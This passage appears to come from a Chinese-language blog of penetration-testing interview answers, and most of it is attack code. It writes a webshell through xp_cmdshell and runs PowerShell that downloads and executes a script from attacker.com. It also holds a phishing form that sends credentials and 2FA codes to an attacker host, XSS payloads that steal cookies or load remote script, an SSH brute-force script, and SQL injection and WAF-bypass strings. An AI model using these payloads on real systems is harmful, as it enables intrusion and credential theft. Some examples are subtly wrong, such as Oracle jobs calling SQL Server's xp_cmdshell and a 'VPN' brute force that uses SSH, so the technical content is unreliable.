<li><strong>利用 xp_cmdshell</strong>：在 SQL Server 中，通过 xp_cmdshell 执行命令写入文件。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%%eval(Request.Item[&quot;xxxasec&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\inetpub\wwwroot\shell.aspx&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><strong>利用 sqlmap</strong>：sqlmap 提供了写马的功能，可以直接将马写入目标服务器。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/vuln.php?id=1&quot;</span> --file-write=<span class="string">&quot;shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Oracle-注入的直接利用方式"><a href="#Oracle-注入的直接利用方式" class="headerlink" title="Oracle 注入的直接利用方式"></a>Oracle 注入的直接利用方式</h3><ul>
<li><strong>利用 DBMS_JOB 提交任务</strong>：通过 DBMS_JOB 提交恶意任务来执行系统命令。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    job_number NUMBER;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    DBMS_JOB.SUBMIT(</span><br><span class="line">        job_number,</span><br><span class="line">        <span class="string">&#x27;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;EXEC xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; END;&#x27;</span>,</span><br><span class="line">        SYSDATE</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></li>
<li><strong>利用 DBMS_SCHEDULER</strong>：通过 DBMS_SCHEDULER 创建任务来执行系统命令。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">        job_name <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;MY_JOB&#x27;</span>,</span><br><span class="line">        job_type <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;PLSQL_BLOCK&#x27;</span>,</span><br><span class="line">        job_action <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;EXEC xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; END;&#x27;</span>,</span><br><span class="line">        start_date <span class="operator">=</span><span class="operator">&gt;</span> SYSDATE,</span><br><span class="line">        enabled <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span></span><br><span class="line">    );</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="SQL-Server-获取-shell-的方法"><a href="#SQL-Server-获取-shell-的方法" class="headerlink" title="SQL Server 获取 shell 的方法"></a>SQL Server 获取 shell 的方法</h3><ul>
<li><strong>利用 xp_cmdshell</strong>：通过 xp_cmdshell 执行系统命令来获取 shell。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://attacker.com/shell.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><strong>利用 OLE Automation Procedures</strong>：通过 OLE Automation Procedures 执行系统命令。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://attacker.com/shell.ps1&#x27;&#x27;)&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="同源策略的绕过方式"><a href="#同源策略的绕过方式" class="headerlink" title="同源策略的绕过方式"></a>同源策略的绕过方式</h3><ul>
<li><strong>DNS 重绑定</strong>：通过动态 DNS 服务，使浏览器认为目标域名和攻击者控制的 IP 地址是同源的。</li>
<li><strong>利用 CORS 配置错误</strong>：如果目标服务器的 CORS 配置不当，可以利用此漏洞绕过同源策略。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://target.com/data&#x27;</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="绕过基于语义检测的-WAF"><a href="#绕过基于语义检测的-WAF" class="headerlink" title="绕过基于语义检测的 WAF"></a>绕过基于语义检测的 WAF</h3><ul>
<li><strong>编码混淆</strong>：使用 URL 编码、Unicode 编码等来绕过 WAF 检测。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) IS NOT NULL AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><strong>拆分查询</strong>：将 SQL 查询拆分为多个部分，分别注入，最后组合成完整的查询。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT 1) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><strong>协议特性</strong>：利用 HTTP 头或 Cookie 参数注入 SQL 代码。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; AND (SELECT 1) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="预编译场景下是否存在-SQL-注入"><a href="#预编译场景下是否存在-SQL-注入" class="headerlink" title="预编译场景下是否存在 SQL 注入"></a>预编译场景下是否存在 SQL 注入</h3><ul>
<li><strong>预编译的 SQL 语句</strong>：预编译的 SQL 语句通常不会存在 SQL 注入问题，因为参数是通过参数化查询传递的，不会被解析为 SQL 代码。</li>
<li><strong>第一次预编译的可控数据</strong>：如果在第一次预编译时，攻击者可以控制某些数据，可能会导致 SQL 注入。例如，动态生成 SQL 语句时，如果未对用户输入进行充分验证，可能会导致注入。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="CDN-的绕过方式"><a href="#CDN-的绕过方式" class="headerlink" title="CDN 的绕过方式"></a>CDN 的绕过方式</h3><ul>
<li><strong>IP 直连</strong>：直接连接到目标服务器的 IP 地址，绕过 CDN。</li>
<li><strong>利用特定的请求头</strong>：通过设置特定的请求头（如 <code>Host</code> 头）来绕过 CDN。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Host: target.com&quot;</span> http://cdn-ip-address</span><br></pre></td></tr></table></figure></li>
<li><strong>利用 CDN 缓存机制</strong>：通过构造特定的请求来利用 CDN 的缓存机制，绕过 CDN 的安全检测。</li>
</ul>
<h2 id="快手"><a href="#快手" class="headerlink" title="快手"></a>快手</h2><h3 id="1-SQL问题：如何取在A中但不在B中的数据"><a href="#1-SQL问题：如何取在A中但不在B中的数据" class="headerlink" title="1. SQL问题：如何取在A中但不在B中的数据"></a><strong>1. SQL问题：如何取在A中但不在B中的数据</strong></h3><p><strong>技术分析</strong>：<br>在SQL中，可以通过 <code>NOT EXISTS</code> 或 <code>LEFT JOIN</code> 实现 A 中存在但 B 中不存在的数据查询。<code>NOT EXISTS</code> 是一种高效的方式，因为它只检查是否存在匹配的记录，而不会返回多余的字段。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方法1：使用 NOT EXISTS</span></span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> a</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">FROM</span> b</span><br><span class="line">    <span class="keyword">WHERE</span> b.id <span class="operator">=</span> a.id</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方法2：使用 LEFT JOIN 和 NULL 判断</span></span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> a</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> b <span class="keyword">ON</span> a.id <span class="operator">=</span> b.id</span><br><span class="line"><span class="keyword">WHERE</span> b.id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<p><strong>优化建议</strong>：  </p>
<ul>
<li>确保 <code>a.id</code> 和 <code>b.id</code> 字段上有索引，以提高查询性能。</li>
<li>如果数据量较大，<code>NOT EXISTS</code> 通常比 <code>LEFT JOIN</code> 更高效。</li>
</ul>
<hr>
<h3 id="2-有堡垒机怎么办？"><a href="#2-有堡垒机怎么办？" class="headerlink" title="2. 有堡垒机怎么办？"></a><strong>2. 有堡垒机怎么办？</strong></h3><p><strong>技术分析</strong>：<br>堡垒机（Jump Server）通常用于限制用户对目标系统的直接访问。绕过堡垒机的方法包括：</p>
<ol>
<li>通过堡垒机的跳板功能，使用 SSH 隧道或代理连接目标系统。</li>
<li>如果堡垒机支持动态端口转发，可以配置本地端口转发。</li>
</ol>
<p><strong>代码示例</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SSH 隧道通过堡垒机访问目标服务器</span></span><br><span class="line">ssh -L 1234:target_server:22 user@bastion_host</span><br><span class="line"><span class="comment"># 然后通过本地端口 1234 访问目标服务器</span></span><br><span class="line">ssh user@localhost -p 1234</span><br></pre></td></tr></table></figure>

<p><strong>工具推荐</strong>：  </p>
<ul>
<li><code>Proxychains</code>：配置代理链，通过堡垒机访问目标。</li>
<li><code>OpenSSH</code>：动态端口转发。</li>
</ul>
<hr>
<h3 id="3-被ban-IP怎么办？"><a href="#3-被ban-IP怎么办？" class="headerlink" title="3. 被ban IP怎么办？"></a><strong>3. 被ban IP怎么办？</strong></h3><p><strong>技术分析</strong>：<br>IP 被封禁后，可以通过以下方式绕过：</p>
<ol>
<li>使用代理 IP 或 VPN 隐藏真实 IP。</li>
<li>如果目标系统使用动态 IP 封禁，可以频繁切换 IP。</li>
<li>利用 Tor 网络进行匿名访问。</li>
</ol>
<p><strong>代码示例（动态代理切换）</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> rotating_proxies <span class="keyword">import</span> RotatingProxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用动态代理池</span></span><br><span class="line">proxy_pool = RotatingProxy()</span><br><span class="line">proxies = proxy_pool.get_proxies()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        <span class="string">&quot;http://example.com&quot;</span>,</span><br><span class="line">        proxies=proxies,</span><br><span class="line">        timeout=<span class="number">10</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;IP blocked, switching proxy: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    proxy_pool.rotate()</span><br></pre></td></tr></table></figure>

<p><strong>工具推荐</strong>：  </p>
<ul>
<li><code>Rotating Proxies</code>：动态代理切换。</li>
<li><code>Tor</code>：匿名网络访问。</li>
</ul>
<hr>
<h3 id="4-登录做了双因素认证怎么办？"><a href="#4-登录做了双因素认证怎么办？" class="headerlink" title="4. 登录做了双因素认证怎么办？"></a><strong>4. 登录做了双因素认证怎么办？</strong></h3><p><strong>技术分析</strong>：<br>双因素认证（2FA）增加了登录难度，但可以通过以下方式绕过：</p>
<ol>
<li><strong>社会工程学攻击</strong>：通过钓鱼页面获取用户的认证码。</li>
<li><strong>中间人攻击</strong>：拦截认证码。</li>
<li><strong>利用漏洞</strong>：某些系统允许绕过 2FA 的 API 调用。</li>
</ol>
<p><strong>代码示例（钓鱼页面）</strong>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 钓鱼页面，伪装成目标网站 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://attacker.com/capture&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;2fa_code&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;2FA Code&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>工具推荐</strong>：  </p>
<ul>
<li><code>Social Engineering Toolkit (SET)</code>：生成钓鱼页面。</li>
<li><code>Burp Suite</code>：拦截和篡改认证码。</li>
</ul>
<hr>
<h3 id="5-VPN服务器没绑定机器编码（证书）吗？"><a href="#5-VPN服务器没绑定机器编码（证书）吗？" class="headerlink" title="5. VPN服务器没绑定机器编码（证书）吗？"></a><strong>5. VPN服务器没绑定机器编码（证书）吗？</strong></h3><p><strong>技术分析</strong>：<br>如果 VPN 服务器未绑定机器编码或证书，可以尝试以下方法：</p>
<ol>
<li><strong>暴力破解</strong>：穷举用户名和密码。</li>
<li><strong>利用已知漏洞</strong>：针对 VPN 软件（如 OpenVPN、PPTP）的漏洞进行攻击。</li>
<li><strong>中间人攻击</strong>：拦截 VPN 流量。</li>
</ol>
<p><strong>代码示例（暴力破解 VPN）</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解 VPN 用户名和密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_vpn</span>(<span class="params">ip, usernames, passwords</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> usernames:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> passwords:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                client = paramiko.SSHClient()</span><br><span class="line">                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">                client.connect(ip, username=user, password=pwd)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success: <span class="subst">&#123;user&#125;</span>/<span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Brute force failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用户名和密码列表</span></span><br><span class="line">usernames = [<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;user&quot;</span>]</span><br><span class="line">passwords = [<span class="string">&quot;password&quot;</span>, <span class="string">&quot;123456&quot;</span>]</span><br><span class="line"></span><br><span class="line">brute_force_vpn(<span class="string">&quot;vpn.example.com&quot;</span>, usernames, passwords)</span><br></pre></td></tr></table></figure>

<p><strong>工具推荐</strong>：  </p>
<ul>
<li><code>Hydra</code>：暴力破解工具。</li>
<li><code>Metasploit</code>：利用 VPN 漏洞。</li>
</ul>
<h3 id="1-00截断的原理"><a href="#1-00截断的原理" class="headerlink" title="1. %00截断的原理"></a><strong>1. %00截断的原理</strong></h3><p>%00（null字节）是一种字符串截断技术，常用于绕过安全检查或触发漏洞。其原理是利用编程语言或系统对字符串处理的特性，当遇到null字节时，会认为字符串结束。这种特性可以被攻击者利用来截断输入，从而绕过验证逻辑。</p>
<h4 id="常见应用场景"><a href="#常见应用场景" class="headerlink" title="常见应用场景"></a><strong>常见应用场景</strong></h4><ul>
<li><strong>文件名处理</strong>：在某些语言（如C&#x2F;C++）中，字符串以null字节结束。如果攻击者在文件名中插入%00，系统可能会截断文件名，导致读取或写入未授权的文件。</li>
<li><strong>数据库操作</strong>：在某些情况下，数据库驱动可能将输入截断到null字节，从而绕过SQL注入防护。</li>
</ul>
<h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a><strong>示例代码</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 假设有一个文件上传功能</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件已存在&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="string">&quot;内容&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件创建成功&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>攻击示例</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/script.php?file=malicious.php%00</span><br></pre></td></tr></table></figure>
<p>通过<code>%00</code>，攻击者可以绕过<code>.txt</code>后缀检查，上传恶意文件。</p>
<h3 id="2-SQL盲注的语句"><a href="#2-SQL盲注的语句" class="headerlink" title="2. SQL盲注的语句"></a><strong>2. SQL盲注的语句</strong></h3><p>SQL盲注是一种通过布尔条件或时间延迟来推断数据库内容的攻击方式。以下是两种常见的盲注方法：</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p>通过判断查询结果的布尔值来推断信息。</p>
<p><strong>示例语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR IF(SUBSTRING(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;, 1, 0) --</span></span><br></pre></td></tr></table></figure>
<p><strong>解释</strong>：</p>
<ul>
<li><code>@@version</code>是MySQL的版本信息。</li>
<li><code>SUBSTRING(@@version,1,1)</code>提取版本的第一个字符。</li>
<li>如果第一个字符是<code>5</code>，则返回<code>1</code>，否则返回<code>0</code>。</li>
<li><code>--</code>用于注释掉多余的SQL语句。</li>
</ul>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h4><p>通过延迟数据库响应时间来判断条件是否成立。</p>
<p><strong>示例语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR IF(SUBSTRING(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;, SLEEP(5), 0) --</span></span><br></pre></td></tr></table></figure>
<p><strong>解释</strong>：</p>
<ul>
<li>如果条件成立，数据库会延迟5秒返回。</li>
<li>攻击者可以通过观察响应时间来判断条件是否成立。</li>
</ul>
<h3 id="3-XSS获取cookie的payload"><a href="#3-XSS获取cookie的payload" class="headerlink" title="3. XSS获取cookie的payload"></a><strong>3. XSS获取cookie的payload</strong></h3><p>XSS（跨站脚本攻击）是一种通过注入恶意脚本窃取用户敏感信息的攻击方式。以下是一个获取cookie的payload：</p>
<h4 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a><strong>简单payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 获取当前页面的cookie</span></span><br><span class="line">    <span class="keyword">var</span> cookie = <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">    <span class="comment">// 将cookie发送到攻击者的服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/steal?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(cookie));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="兼容旧浏览器的payload"><a href="#兼容旧浏览器的payload" class="headerlink" title="兼容旧浏览器的payload"></a><strong>兼容旧浏览器的payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&#x27;http://attacker.com/steal?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="更隐蔽的payload"><a href="#更隐蔽的payload" class="headerlink" title="更隐蔽的payload"></a><strong>更隐蔽的payload</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 使用setTimeout延迟执行，避免被WAF检测</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        s.<span class="property">src</span> = <span class="string">&#x27;http://attacker.com/malicious.js&#x27;</span>;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Server命令执行的方法"><a href="#SQL-Server命令执行的方法" class="headerlink" title="SQL Server命令执行的方法"></a>SQL Server命令执行的方法</h3><p>除了<code>xp_cmdshell</code>，还有以下方法：</p>
<ul>
<li><p><strong>sp_OACreate</strong> ：通过创建<code>OLE</code>对象实例，然后利用<code>sp_oamethod</code>调用该对象的方法来执行命令。例如，先判断<code>sp_OACreate</code>是否存在，若存在则开启相关配置，最后执行命令并将结果导出至文本中：</p>
<ul>
<li><p>判断是否存在：<code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;SP_OACREATE&#39;</code></p>
</li>
<li><p>开启配置：</p>
<ul>
<li><code>EXEC sp_configure &#39;show advanced options&#39;, 1;</code></li>
<li><code>RECONFIGURE WITH OVERRIDE;</code></li>
<li><code>EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;</code></li>
<li><code>RECONFIGURE WITH OVERRIDE;</code></li>
</ul>
</li>
<li><p>执行命令：<code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#39;</code></p>
</li>
</ul>
</li>
<li><p><strong>CLR</strong> ：在SQL Server上启用<code>CLR</code>并创建自定义存储过程，通过编写<code>C#</code>代码来实现命令执行。例如，使用<code>visual studio 2022</code>创建<code>SQL Server</code>数据库项目，编写代码后编译导入程序集并创建执行命令存储过程的<code>SQL</code>语句。</p>
</li>
</ul>
<h3 id="SQL注入引号绕过"><a href="#SQL注入引号绕过" class="headerlink" title="SQL注入引号绕过"></a>SQL注入引号绕过</h3><p>SQL注入引号绕过通常是在SQL注入攻击中，为了构造合法的SQL语句，采用一些技巧来避免使用引号。例如，利用字符串连接符、函数等来代替引号。比如，<code>&#39;</code>可以用<code>char(39)</code>来代替，<code>&quot;</code>可以用<code>char(34)</code>来代替。另外，还可以利用SQL语句中的注释符来绕过引号限制，如<code>/*</code>和<code>*/</code>。</p>
